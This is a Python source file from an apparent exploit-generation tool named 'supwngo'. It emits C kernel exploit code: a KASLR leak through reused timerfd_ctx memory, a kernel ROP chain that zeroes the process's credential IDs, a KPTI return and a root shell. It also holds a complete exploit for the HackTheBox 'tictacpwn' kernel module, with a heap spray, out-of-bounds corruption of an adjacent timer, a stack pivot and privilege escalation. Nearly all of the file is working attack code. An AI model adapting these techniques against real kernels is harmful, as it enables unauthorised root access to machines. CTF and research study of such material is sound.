"""
Kernel exploit template generation.

Generates C exploit code for kernel vulnerabilities.
"""

from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional

from supwngo.kernel.module import KernelModule, IoctlCommand, KmallocCall
from supwngo.kernel.symbols import KernelSymbols
from supwngo.kernel.krop import KernelROPBuilder
from supwngo.kernel.slab import SlabAllocator, SlabSpray
from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


EXPLOIT_HEADER = '''/*
 * Kernel Exploit Template
 * Generated by supwngo
 *
 * Target: {target_name}
 * Vulnerability: {vuln_type}
 * Technique: {technique}
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>
#include <assert.h>
'''


COMMON_INCLUDES = '''
/* Timer-based spray */
#include <sys/timerfd.h>
#include <time.h>

/* Message queue spray */
#include <sys/msg.h>

/* Signals for state saving */
#include <signal.h>
'''


USERSPACE_STATE_CODE = '''
/* Save userspace state for return from kernel */
unsigned long user_cs, user_ss, user_rsp, user_rflags;

static void save_state() {
    __asm__ volatile (
        "mov %%cs, %0\\n"
        "mov %%ss, %1\\n"
        "mov %%rsp, %2\\n"
        "pushfq\\n"
        "pop %3\\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        :
        : "memory"
    );
}

static void win() {
    if (getuid() == 0) {
        printf("[+] Got root!\\n");
        char *args[] = {"/bin/sh", NULL};
        execve("/bin/sh", args, NULL);
    } else {
        printf("[-] Exploit failed, uid=%d\\n", getuid());
        exit(1);
    }
}
'''


@dataclass
class KernelExploitTemplate:
    """
    Generate kernel exploit templates.

    Creates C code for various kernel exploitation scenarios.
    """

    module: Optional[KernelModule] = None
    symbols: Optional[KernelSymbols] = None
    rop_builder: Optional[KernelROPBuilder] = None

    # Exploit configuration
    device_path: str = "/dev/vuln"
    ioctl_commands: Dict[str, int] = field(default_factory=dict)
    slab_target: str = "kmalloc-256"

    # Gadget offsets (relative to kernel base)
    gadget_offsets: Dict[str, int] = field(default_factory=dict)

    def generate_ioctl_helpers(self) -> str:
        """Generate IOCTL wrapper functions."""
        code = f'''
/* IOCTL definitions and helpers */
#define DEVICE_PATH "{self.device_path}"

'''
        for name, code_val in self.ioctl_commands.items():
            code += f"#define {name.upper()} 0x{code_val:08x}\n"

        code += '''
static int dev_fd = -1;

int open_device() {
    dev_fd = open(DEVICE_PATH, O_RDWR);
    if (dev_fd < 0) {
        perror("open device");
        exit(1);
    }
    return dev_fd;
}

void close_device() {
    if (dev_fd >= 0) {
        close(dev_fd);
        dev_fd = -1;
    }
}
'''
        return code

    def generate_leak_kaslr_code(
        self,
        leak_method: str = "timerfd",
        leak_offset: int = 0x3370e0,
        leak_func_name: str = "timerfd_tmrproc",
    ) -> str:
        """
        Generate KASLR leak code.

        Args:
            leak_method: Method to use for leak
            leak_offset: Offset of leaked function from kernel base
            leak_func_name: Name of leaked function
        """
        return f'''
/* KASLR Bypass via {leak_method} */
#define {leak_func_name.upper()}_OFFSET 0x{leak_offset:x}

unsigned long kernel_base = 0;

unsigned long leak_kernel_pointer() {{
    char buf[0x100] = {{0}};
    unsigned long leaked = 0;

    // Method: Allocate timerfd, free it, reallocate with vuln object
    // Read uninitialized memory to get function pointer

    struct timespec ts;
    clock_gettime(CLOCK_REALTIME, &ts);
    ts.tv_sec += 5;

    // Create and arm timer
    int timer_fd = timerfd_create(CLOCK_REALTIME, 0);
    struct itimerspec its = {{{{0, 0}}, {{ts.tv_sec, 1337}}}};
    timerfd_settime(timer_fd, TFD_TIMER_ABSTIME, &its, NULL);

    // Free timer (leaves timerfd_ctx in freelist with data intact)
    close(timer_fd);

    // Allocate our object in same slot
    // TODO: Replace with actual allocation ioctl
    // ioctl(dev_fd, IOCTL_ALLOC, 0);

    // Read uninitialized data
    // TODO: Replace with actual read ioctl
    // ioctl(dev_fd, IOCTL_READ, &buf);

    // Function pointer at offset +40
    leaked = *(unsigned long*)(&buf[40]);

    if ((leaked >> 48) != 0xffff) {{
        printf("[-] Leak failed: 0x%lx\\n", leaked);
        return 0;
    }}

    kernel_base = leaked - {leak_func_name.upper()}_OFFSET;
    printf("[+] Leaked {leak_func_name}: 0x%lx\\n", leaked);
    printf("[+] Kernel base: 0x%lx\\n", kernel_base);

    return kernel_base;
}}
'''

    def generate_rop_chain_code(
        self,
        gadget_offsets: Dict[str, int],
        technique: str = "cred_overwrite",
    ) -> str:
        """
        Generate ROP chain setup code.

        Args:
            gadget_offsets: Dict of gadget name to offset from kernel base
            technique: Exploitation technique
        """
        code = "/* ROP Gadget Offsets */\n"
        for name, offset in gadget_offsets.items():
            code += f"#define GADGET_{name.upper()} 0x{offset:x}\n"

        code += '''

unsigned long* rop_chain;

void setup_rop_chain() {
    // Allocate page for stack pivot
    // mmap at address accessible by 32-bit esp (mov esp, VALUE truncates to 32-bit)
    rop_chain = mmap(
        (void*)(0xf6000000 - 0x2000),
        0x4000,
        PROT_READ | PROT_WRITE,
        MAP_ANON | MAP_PRIVATE | MAP_FIXED | MAP_POPULATE,
        -1, 0
    );

    if (rop_chain == MAP_FAILED) {
        perror("mmap for ROP");
        exit(1);
    }

    // Point to middle of allocation
    rop_chain = (unsigned long*)((char*)rop_chain + 0x2000);

    unsigned long* p = rop_chain;

'''
        if technique == "cred_overwrite":
            code += '''
    // ROP chain: find_task_by_vpid(getpid()) -> overwrite cred -> return

    *p++ = kernel_base + GADGET_POP_RDI;
    *p++ = getpid();
    *p++ = kernel_base + GADGET_FIND_TASK_BY_VPID;

    // rax now contains task_struct pointer
    // Need to: deref real_cred, add uid offset, zero it

    *p++ = kernel_base + GADGET_POP_RDI;
    *p++ = 0xa60;  // offset of real_cred in task_struct (ADJUST FOR KERNEL VERSION)
    *p++ = kernel_base + GADGET_ADD_RAX_RDI;
    *p++ = kernel_base + GADGET_MOV_RAX_QWORD_RAX;  // rax = task->real_cred

    // Zero uid/gid
    *p++ = kernel_base + GADGET_POP_RDI;
    *p++ = 4;  // uid offset in cred struct
    *p++ = kernel_base + GADGET_ADD_RAX_RDI;
    *p++ = kernel_base + GADGET_MOV_QWORD_RAX_0;  // zero uid+gid

    // Zero suid/sgid
    *p++ = kernel_base + GADGET_POP_RDI;
    *p++ = 8;
    *p++ = kernel_base + GADGET_ADD_RAX_RDI;
    *p++ = kernel_base + GADGET_MOV_QWORD_RAX_0;

    // Zero euid/egid
    *p++ = kernel_base + GADGET_ADD_RAX_RDI;
    *p++ = kernel_base + GADGET_MOV_QWORD_RAX_0;

    // Zero fsuid/fsgid
    *p++ = kernel_base + GADGET_ADD_RAX_RDI;
    *p++ = kernel_base + GADGET_MOV_QWORD_RAX_0;
'''

        code += '''
    // Return to userspace
    // Use KPTI-safe trampoline if available
    *p++ = kernel_base + GADGET_KPTI_TRAMPOLINE;
    *p++ = 0;  // dummy
    *p++ = 0;  // dummy
    *p++ = (unsigned long)win;  // user rip
    *p++ = user_cs;
    *p++ = user_rflags;
    *p++ = user_rsp;
    *p++ = user_ss;

    printf("[+] ROP chain setup at 0x%lx\\n", (unsigned long)rop_chain);
}
'''
        return code

    def generate_heap_spray_code(self) -> str:
        """Generate heap spray code based on target cache."""
        return SlabSpray.get_spray_for_cache(self.slab_target)

    def generate_trigger_code(
        self,
        vuln_type: str = "oob_write",
        oob_offset: int = 0,
        oob_size: int = 32,
    ) -> str:
        """
        Generate vulnerability trigger code.

        Args:
            vuln_type: Type of vulnerability
            oob_offset: Offset of OOB access
            oob_size: Size of OOB access
        """
        return f'''
/* Trigger vulnerability */
void trigger_vuln() {{
    printf("[*] Triggering {vuln_type}...\\n");

    // OOB access: {oob_size} bytes past allocation boundary
    // Offset into next chunk: {oob_offset}

    char payload[0x120] = {{0}};

    // Setup payload to corrupt adjacent timerfd_ctx
    // Overwrite rb_right pointer to point to our fake timer

    // TODO: Fill with appropriate payload
    // *(unsigned long*)(&payload[256 + 8]) = fake_timer_addr;

    // ioctl(dev_fd, IOCTL_WRITE, &payload);
}}
'''

    def generate_full_exploit(
        self,
        target_name: str = "vuln_module",
        vuln_type: str = "heap_oob",
        technique: str = "cred_overwrite",
        ioctl_commands: Optional[Dict[str, int]] = None,
        gadget_offsets: Optional[Dict[str, int]] = None,
    ) -> str:
        """
        Generate complete exploit code.

        Args:
            target_name: Name of target module
            vuln_type: Vulnerability type
            technique: Exploitation technique
            ioctl_commands: IOCTL command codes
            gadget_offsets: ROP gadget offsets

        Returns:
            Complete C exploit code
        """
        if ioctl_commands:
            self.ioctl_commands = ioctl_commands
        if gadget_offsets:
            self.gadget_offsets = gadget_offsets

        code_parts = [
            EXPLOIT_HEADER.format(
                target_name=target_name,
                vuln_type=vuln_type,
                technique=technique,
            ),
            COMMON_INCLUDES,
            USERSPACE_STATE_CODE,
            self.generate_ioctl_helpers(),
            self.generate_heap_spray_code(),
            self.generate_leak_kaslr_code(),
            self.generate_rop_chain_code(self.gadget_offsets, technique),
            self.generate_trigger_code(vuln_type),
            self._generate_main(),
        ]

        return "\n".join(code_parts)

    def _generate_main(self) -> str:
        """Generate main function."""
        return '''
int main(int argc, char** argv) {
    printf("[*] Kernel Exploit\\n");

    // Save userspace state for return
    save_state();
    printf("[+] Saved userspace state\\n");

    // Open vulnerable device
    open_device();
    printf("[+] Opened device\\n");

    // Leak kernel base via KASLR bypass
    if (!leak_kernel_pointer()) {
        printf("[-] Failed to leak kernel base\\n");
        return 1;
    }

    // Setup ROP chain
    setup_rop_chain();

    // Spray heap to setup feng shui
    printf("[*] Spraying heap...\\n");
    // spray_timers(...);

    // Trigger vulnerability
    trigger_vuln();

    // Wait for timer to fire (if using timerfd technique)
    printf("[*] Waiting for privilege escalation...\\n");
    while (getuid() != 0) {
        sleep(1);
    }

    win();
    return 0;
}
'''

    def generate_tictacpwn_exploit(self) -> str:
        """
        Generate exploit specifically for tictacpwn challenge.

        This challenge features:
        - ttp.ko kernel module
        - kmalloc-256 OOB read/write (32 bytes)
        - timerfd_ctx target structure
        - KASLR bypass via uninitialized heap
        """
        ioctl_commands = {
            "TTP_ALLOC": 0x40087401,
            "TTP_FREE": 0x40087402,
            "TTP_WRITE": 0x40087403,
            "TTP_READ": 0x40087404,
        }

        gadget_offsets = {
            # These offsets are from the writeup - need actual values per kernel
            "pop_rdi": 0x8e2f0,
            "pop_rsi": 0x13acbe,
            "pop_rax": 0x4d11f,
            "find_task_by_vpid": 0xc5230,
            "add_rax_rdi": 0x3ba2e,
            "mov_rax_qword_rax": 0x129174,
            "mov_qword_rax_0": 0x4a5738,
            "mov_esp_pivot": 0x311655,  # mov esp, 0xf6000000; ret
            "xchg_rax_rbp": 0x74bfb1,
            "push_rax_pop_rbp": 0x8b1c4,
            "lea_rsp_rbp": 0x392e,
            "kpti_trampoline": 0xe00a30,
        }

        return f'''/*
 * tictacpwn Exploit
 * Generated by supwngo
 *
 * Challenge: HackTheBox tictacpwn
 * Target: ttp.ko kernel module
 * Vulnerability: kmalloc-256 heap OOB R/W (32 bytes)
 * Technique: timerfd_ctx corruption -> kernel ROP -> cred overwrite
 */

{EXPLOIT_HEADER.format(
    target_name="ttp.ko",
    vuln_type="Heap OOB Read/Write",
    technique="timerfd + kernel ROP"
)}

{COMMON_INCLUDES}

{USERSPACE_STATE_CODE}

/* IOCTL interface */
#define DEVICE_PATH "/dev/ttp"

#define TTP_ALLOC 0x40087401
#define TTP_FREE  0x40087402
#define TTP_WRITE 0x40087403
#define TTP_READ  0x40087404

struct ttp_arg {{
    size_t idx;
    size_t size;
    void* buffer;
}};

int ttp_fd = -1;

void ttp_alloc(size_t idx) {{
    ioctl(ttp_fd, TTP_ALLOC, idx);
}}

void ttp_free(size_t idx) {{
    ioctl(ttp_fd, TTP_FREE, idx);
}}

void ttp_read(size_t idx, void* buf, size_t sz) {{
    struct ttp_arg arg = {{idx, sz, buf}};
    ioctl(ttp_fd, TTP_READ, &arg);
}}

void ttp_write(size_t idx, void* buf, size_t sz) {{
    struct ttp_arg arg = {{idx, sz, buf}};
    ioctl(ttp_fd, TTP_WRITE, &arg);
}}

/* Kernel offsets */
''' + "\n".join(f"#define OFF_{k.upper()} 0x{v:x}" for k, v in gadget_offsets.items()) + '''

unsigned long kbase = 0;

/* Timer management */
int make_timer(struct timespec* ts, int plus_sec) {{
    struct itimerspec its = {{{{0, 0}}, {{ts->tv_sec + plus_sec, 1337}}}};
    int fd = timerfd_create(CLOCK_REALTIME, 0);
    timerfd_settime(fd, TFD_TIMER_ABSTIME, &its, NULL);
    return fd;
}}

/* Leak KASLR via uninitialized timerfd_ctx */
unsigned long leak_kbase(struct timespec* ts) {{
    char buf[256] = {{0}};

    // Create and free timer to leave timerfd_ctx data
    int timer = make_timer(ts, 5);
    close(timer);

    // Allocate our buffer in same slot
    ttp_alloc(0);
    ttp_read(0, buf, sizeof(buf));
    ttp_free(0);

    // timerfd_tmrproc at offset +40
    unsigned long leak = *(unsigned long*)(&buf[40]);

    if ((leak >> 48) != 0xffff) {{
        printf("[-] Leak failed: 0x%lx\\n", leak);
        return 0;
    }}

    kbase = leak - 0x3370e0;  // timerfd_tmrproc offset
    printf("[+] timerfd_tmrproc: 0x%lx\\n", leak);
    printf("[+] Kernel base: 0x%lx\\n", kbase);
    return kbase;
}}

/* Leak heap address from list pointer */
unsigned long get_chunk_addr(struct timespec* ts) {{
    char buf[256] = {{0}};

    int timer = make_timer(ts, 10);
    close(timer);

    ttp_alloc(1);
    ttp_read(1, buf, sizeof(buf));

    // Self-referencing list at offset 0x90
    unsigned long heap_ptr = *(unsigned long*)(&buf[0x90]);
    printf("[+] Heap chunk addr: 0x%lx\\n", heap_ptr - 0x90);
    return heap_ptr - 0x90;
}}

/* ROP chain setup */
unsigned long* rop;

void setup_rop() {{
    rop = mmap((void*)(0xf6000000 - 0x2000), 0x4000,
               PROT_READ | PROT_WRITE,
               MAP_ANON | MAP_PRIVATE | MAP_FIXED | MAP_POPULATE, -1, 0);
    assert(rop != MAP_FAILED);
    rop = (unsigned long*)((char*)rop + 0x2000);

    unsigned long* p = rop;

    // find_task_by_vpid(getpid())
    *p++ = kbase + OFF_POP_RDI;
    *p++ = getpid();
    *p++ = kbase + OFF_FIND_TASK_BY_VPID;

    // rax = task_struct, get real_cred
    *p++ = kbase + OFF_POP_RDI;
    *p++ = 0xa60;  // real_cred offset (ADJUST!)
    *p++ = kbase + OFF_ADD_RAX_RDI;
    *p++ = kbase + OFF_MOV_RAX_QWORD_RAX;

    // Zero uid/gid at cred+4
    *p++ = kbase + OFF_POP_RDI;
    *p++ = 4;
    *p++ = kbase + OFF_ADD_RAX_RDI;
    *p++ = kbase + OFF_MOV_QWORD_RAX_0;

    // Zero suid/sgid
    *p++ = kbase + OFF_POP_RDI;
    *p++ = 8;
    *p++ = kbase + OFF_ADD_RAX_RDI;
    *p++ = kbase + OFF_MOV_QWORD_RAX_0;

    // Zero euid/egid
    *p++ = kbase + OFF_ADD_RAX_RDI;
    *p++ = kbase + OFF_MOV_QWORD_RAX_0;

    // Zero fsuid/fsgid
    *p++ = kbase + OFF_ADD_RAX_RDI;
    *p++ = kbase + OFF_MOV_QWORD_RAX_0;

    // Stack pivot back
    *p++ = kbase + OFF_POP_RDI;
    *p++ = 0x60;
    *p++ = kbase + OFF_POP_RSI;

    // Setup for return
    *(unsigned long*)(p - 0x1000/8) = kbase + OFF_ADD_RAX_RDI;
    *p++ = (unsigned long)p - 0x1000 + 0x70;
    *p++ = kbase + OFF_XCHG_RAX_RBP;
    *p++ = kbase + OFF_PUSH_RAX_POP_RBP;
    *p++ = kbase + OFF_LEA_RSP_RBP;
    *p++ = 0;  // rbx
    *p++ = 0;  // r12
    *p++ = 0;  // rbp

    printf("[+] ROP chain ready at 0x%lx\\n", (unsigned long)rop);
}}

/* Spray and overlap */
#define SPRAY_COUNT 32
int timers[SPRAY_COUNT];

void do_overlap(struct timespec* ts, unsigned long evil_timer) {{
    // Spray timers
    for (int i = 0; i < SPRAY_COUNT; i++) {{
        timers[i] = make_timer(ts, 100 + i);
    }}

    // Free one to create hole
    close(timers[16]);
    usleep(100000);

    // Allocate our chunk in the hole
    ttp_alloc(2);

    // Read OOB to find adjacent timer
    char buf[0x120] = {{0}};
    ttp_read(2, buf, sizeof(buf));

    unsigned long expires = *(unsigned long*)(&buf[256 + 24]);
    if (expires % 10000 != 1337) {{
        printf("[-] Failed to overlap\\n");
        exit(1);
    }}

    int idx = (expires / 1000000000 - ts->tv_sec) - 100;
    printf("[+] Overlapped timer %d\\n", idx);

    // Overwrite rb_right to point to our fake timer
    *(unsigned long*)(&buf[256 + 8]) = evil_timer;
    ttp_write(2, buf, sizeof(buf));
    printf("[+] Corrupted rb_right pointer\\n");
}}

int main() {{
    printf("[*] tictacpwn exploit\\n");

    save_state();
    ttp_fd = open(DEVICE_PATH, O_RDWR);
    assert(ttp_fd >= 0);

    struct timespec ts;
    clock_gettime(CLOCK_REALTIME, &ts);
    ts.tv_sec += 3;

    // Leak KASLR
    if (!leak_kbase(&ts)) return 1;

    // Get heap chunk address for fake timer
    unsigned long fake_timer = get_chunk_addr(&ts);

    // Setup fake timer with ROP pivot gadget as function pointer
    char fake[256] = {{0}};
    *(unsigned long*)(&fake[40]) = kbase + OFF_MOV_ESP_PIVOT;  // Stack pivot
    ttp_write(1, fake, sizeof(fake));

    // Setup ROP chain in userspace
    setup_rop();

    // Spray and trigger
    do_overlap(&ts, fake_timer);

    // Wait for root
    printf("[*] Waiting...\\n");
    while (getuid() != 0) sleep(1);

    win();
    return 0;
}}
'''
